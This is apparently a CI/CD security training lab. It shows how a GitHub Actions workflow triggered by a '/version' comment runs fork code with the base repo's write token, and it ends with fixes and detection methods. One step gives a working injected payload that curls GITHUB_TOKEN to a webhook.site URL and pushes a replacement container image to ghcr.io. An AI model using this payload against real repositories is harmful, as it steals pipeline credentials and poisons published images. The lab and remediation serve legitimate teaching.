# Comment-triggered workflow with no authorization checks (Direct Script Injection)

**What:** The `Auto Bump Versions` workflow is a ChatOps helper — it runs whenever
**anyone** comments `/version <level>` on a pull request. It then **checks out the PR's
fork code** and executes `scripts/version.sh` from that fork, using the **base repo's**
write-scoped `GITHUB_TOKEN`. There is **no check on who sent the comment**.

**Risk:** A stranger with only a free GitHub account — no SSH key, no PAT, not a
collaborator — can open a PR, edit `version.sh` in their own fork to add any commands they
like, comment `/version minor`, and have those commands run inside the base repo's CI with
a write-scoped token. This is arbitrary code execution in the target's pipeline.

> This is **OWASP CICD-SEC-1: Insufficient Flow Control Mechanisms / Insufficient
> Authorization**, demonstrated as a *direct script injection* — the attacker's code is
> placed straight into a script the privileged workflow runs, with no obfuscation needed.
> It mirrors the real-world `project-akri/akri` `/version` attack.

---

## Why `issue_comment` is dangerous

`issue_comment` workflows **always run from the base repository's default branch**, with the
base repo's secrets and a write-scoped `GITHUB_TOKEN` — even when the comment is posted on a
pull request opened from a fork. The trigger itself is fine. The vulnerability is the
**combination** of three choices in this workflow:

1. **No authorization check** — any commenter triggers it, not just maintainers.
2. **Checks out the fork's PR head** — i.e. attacker-controlled files.
3. **Executes a script from that checkout** (`version.sh`) with the privileged token.

Remove any one of those three and the attack collapses. The fix section shows how.

---

## Setup — before you start

Each participant needs **two separate GitHub accounts** for this exercise:

| Role | Purpose | Suggested naming |
|------|---------|-----------------|
| **Target** | Owns the repo being attacked; plays the maintainer | `yourname-target` |
| **Attacker** | Opens a PR and triggers the command from a fork | `yourname-attacker` |

Create both accounts now if you have not already. Free accounts are fine for both.

---

## PHASE 1 — Target account: fork the exercise repo

Log in to GitHub as your **target** account.

### 1.1 Fork the source repository

1. Open the course repo: `https://github.com/cybersecuritytraining2-cmyk/Exercise-2-No-Authorization-Checks`
2. Click **Fork** → **Create fork**
3. GitHub creates your own copy: `https://github.com/<target-username>/Exercise-2-No-Authorization-Checks`

This is the repo you will attack and later fix. All your work during this exercise lives here.

### 1.2 Enable GitHub Actions on your fork

GitHub disables Actions on forks by default.

1. In your fork, go to **Settings → Actions → General**
2. Under *Actions permissions*, select **Allow all actions and reusable workflows**
3. Scroll to *Workflow permissions*, select **Read and write permissions**
4. Click **Save**

### 1.3 Authenticate the GitHub CLI (for the remediation phase later)

Open a terminal and log in as your **target** account:

```bash
gh auth login
```

Follow the prompts:
- **GitHub.com** (not Enterprise)
- **HTTPS**
- **Login with a web browser** → copy the one-time code, open the URL, paste the code, authorize

Confirm you are logged in as your target account:

```bash
gh auth status
```

Clone your fork:

```bash
git clone https://github.com/<target-username>/Exercise-2-No-Authorization-Checks
cd Exercise-2-No-Authorization-Checks
```

---

## PHASE 2 — Attacker account: fork, inject, and trigger

Open a **private/incognito browser window** and log in to GitHub as your **attacker** account.

> Keep both browser sessions open side by side — you will switch between them.

### 2.1 Fork the target's repository

1. Navigate to your target's fork: `https://github.com/<target-username>/Exercise-2-No-Authorization-Checks`
2. Click **Fork** → **Create fork**
3. GitHub creates: `https://github.com/<attacker-username>/Exercise-2-No-Authorization-Checks`

### 2.2 Get a webhook URL to capture the token

1. Open [https://webhook.site](https://webhook.site) in the attacker browser window
2. Copy the unique URL shown (looks like `https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`)

### 2.3 Inject the payload into `scripts/version.sh`

In the **attacker fork** on GitHub, open `scripts/version.sh` and click the pencil (edit) icon.
Insert the payload **immediately after the shebang line** — exactly as in the real akri attack,
direct and unobfuscated, so it runs before any legitimate script logic:

```bash
#!/usr/bin/env bash
# --- injected payload: runs with the base repo's GITHUB_TOKEN ---
curl -s "https://webhook.site/YOUR-UUID-HERE" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR"

# Abuse the token immediately (it is revoked the moment the job exits)
echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin
docker pull ubuntu:latest
docker tag ubuntu:latest ghcr.io/<target-username>/pipeline-security-backend:latest
docker push ghcr.io/<target-username>/pipeline-security-backend:latest
# --- end payload; original script continues below ---
#
# version.sh — bump the SwiftDrop project version across all manifests.
...
```

Substitutions:
- Replace `YOUR-UUID-HERE` with your webhook.site UUID
- Replace `<target-username>` with your target GitHub username

Leave the rest of `version.sh` untouched. Commit directly to the attacker fork's `main` branch.

### 2.4 Open a pull request against the target's repo

1. In the attacker fork, click **Contribute → Open pull request**
2. Title: `Docs: clarify version bump usage` *(innocuous-looking)*
3. Confirm the PR targets `<target-username>/Exercise-2-No-Authorization-Checks` — **not** the original course repo
4. Click **Create pull request**

### 2.5 Trigger the workflow with a comment

On the pull request you just opened, post a comment containing exactly:

```
/version minor
```

That single comment is the entire trigger. You are not a collaborator on the target repo and
have no permissions there — but the workflow has **no authorization check**, so it runs anyway.

---

## PHASE 3 — Observe the attack execute

Switch to your **target account browser window**.

1. Go to your fork's **Actions** tab
2. The `Auto Bump Versions` workflow has started — click it to watch live logs
3. The **Check out the PR branch** step pulls the **attacker's fork** code
4. The **Run version bump** step executes `version.sh` — the **attacker's version** — with the
   base repo's `GITHUB_TOKEN`

Switch to **webhook.site** in the attacker window — within seconds you will see:

```
token=ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxx
repo=<target-username>/Exercise-2-No-Authorization-Checks
actor=<attacker-username>
```

The `actor` is the **attacker** — confirming an unprivileged outsider drove a privileged
workflow purely by commenting on a PR.

> **Important:** `GITHUB_TOKEN` is ephemeral — GitHub revokes it the instant the run completes.
> The token shown in webhook.site is already dead. Any abuse must happen **inside the same job**,
> which is why the payload exfiltrates *and* pushes the fake image in one shot.

---

## PHASE 4 — Remediation

Switch back to the **target account**. You are the maintainer fixing the workflow.

```bash
cd Exercise-2-No-Authorization-Checks
gh auth switch   # select your target account if needed
```

The root cause is *no authorization check* on a workflow that *runs untrusted fork code with a
privileged token*. Apply **both** of the following defenses — layered, not either/or.

### Fix 1 — gate the command on the commenter's permission

Only repository members and collaborators should be able to run `/version`. GitHub exposes the
commenter's relationship to the repo via `github.event.comment.author_association`:

```yaml
jobs:
  bump:
    if: >
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/version') &&
      contains(fromJSON('["OWNER", "MEMBER", "COLLABORATOR"]'),
               github.event.comment.author_association)
```

A first-time contributor's comment has `author_association: NONE` or `CONTRIBUTOR`, so the job
is skipped entirely. This single line would have blocked the attack above.

> **Note:** `author_association` is convenient but coarse. For stronger control, call the API
> (`GET /repos/{owner}/{repo}/collaborators/{username}/permission`) and require `admin`/`write`.

### Fix 2 — never execute fork code with the privileged token

Even with an authorization gate, do not run a contributor-supplied script under the base token.
Run the project's **own** trusted copy of the script, checked out from the base repo:

```yaml
- name: Check out the BASE repo (trusted code)
  uses: actions/checkout@v4
  # no 'repository:' / 'ref:' override — checks out the base repo, not the fork
```

If the bump genuinely needs to act on the PR branch, split the job: do privileged work in an
`issue_comment` job using only base-repo code, and run anything that touches fork content in a
separate `pull_request` job that has **no secrets** and a read-only token.

### Apply and push the fix

Edit `.github/workflows/version-bump.yml` with Fix 1 (and Fix 2), then:

```bash
git add .github/workflows/version-bump.yml
git commit -m "Fix: require maintainer authorization for /version and stop running fork code"
git push
```

Re-run the attack from the attacker account — the workflow is now **skipped** because the
attacker's `author_association` is not in the allow-list.

---

## How the vulnerability works — summary

| Authorization check | Checks out fork code | Runs fork script w/ token | Result |
|---------------------|----------------------|---------------------------|--------|
| None | Yes | Yes | **Anyone gets code execution** |
| `author_association` gate | Yes | Yes | Outsiders blocked; insiders still risky |
| `author_association` gate | No (base code) | No | Safe |

The vulnerable workflow is the first row. The remediation moves it to the last.

---

## Discovery methods

- **Manual testing:** open a PR from a throwaway account and comment `/version minor`; watch it run.
- **Code review:** look for `on: issue_comment` workflows that `checkout` a PR head and `run` a
  script, with no `author_association` / permission check in the job `if:`.
- **SAST:** rules for "untrusted checkout in privileged trigger" (e.g. `issue_comment` /
  `pull_request_target`) flag this — see *Snyk*, *octoscan*, *zizmor*, *StepSecurity* checks.
- **DAST / dynamic:** trigger the comment command from an unprivileged identity and observe the
  workflow executing with elevated permissions.
